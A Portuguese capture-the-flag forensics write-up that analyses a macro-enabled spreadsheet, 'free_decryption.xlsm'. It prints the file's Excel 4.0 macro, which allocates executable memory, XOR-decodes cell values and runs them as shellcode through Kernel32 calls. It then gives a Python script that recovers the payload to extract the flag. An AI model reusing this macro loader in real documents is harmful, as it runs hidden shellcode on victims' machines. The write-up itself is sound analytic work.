#Difficult : Easy #Category : Forensics
#### Info
Recebemos um arquivo `xlsm`, que podemos primeiro ver suas propriedades e depois abrir com algum editor como `libreoffice` ou `wpsoffice`.

```sh
exiftool ./free_decryption.xlsm
```
![[Pasted image 20250513104558.png]]

Vemos que ele tem uma macro, vamos então abrir o documento para ver seu conteúdo. Ao abrir no `wpsoffice` temos o seguinte resultado.
![[Pasted image 20250513110413.png]]

#### Code analysis
Embora eu não saiba exatamente o que cada linha faz, podemos tentar descobrir a intenção do script.
```sh
=SELECT(E1:G258)
=CALL("Kernel32","VirtualAlloc","JJJJJ",0,386,4096,64)
=SET.VALUE(C1,0)
=FOR("counter",0,772,2)
=SET.VALUE(B1,CHAR(BITXOR(ACTIVE.CELL(),24)))
=CALL("Kernel32","WriteProcessMemory","JJJCJJ",-1,A2+C1,Β1,LEN(Β1),0)
=SET.VALUE(C1,C1+1)
=SELECT(,"RC[2]")
=NEXT()
=CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C6, 0, 0, 0)
=WORKBOOK.ACTIVATE("Sheet1")
HALT()
```

Primeiro ele seleciona as células que contém os números, depois pede para a Kernel alocar um espaço de memória. Após isso ele vai fazendo uma iteração  de 2 em 2 nos valores das células e fazendo um `bitXOR` entre a célula selecionada e `24` e então adiciona esse valor a memória. Podemos fazer o mesmo processo para ver qual binário se origina.

#### flag
Primeiro precisamos tratar o os números, colocando todos na mesma linha separadas por vírgula, utilizei o `neovim` para isso.
```nvim
%s/\n/,/g
%s/\s\+/,/g
```
![[Pasted image 20250513114407.png]]
Sobrou uma vírgula na última linha, podemos então nós mesmo retita-la. E salvei em um arquivo chamado `cells`

Agora criamos o `exploit` que irá recriar o binário.
```python
cells = open('./cells','r').read()
pre_numbers = cells.replace("\n","").split(",")
numbers = pre_numbers[::2]

key = 24
shellcode = b''

xor_result = [int(num) ^ key for num in numbers]

shellcode = bytes(xor_result)

open("shellcode.bin", "wb").write(shellcode)
```

Podemos então usar o comando `strings` para pegar a flag.
```sh
python exploit.py
strings shellcode.bin
```
![[Pasted image 20250513135632.png]]
***
![[Pasted image 20250513135744.png]]
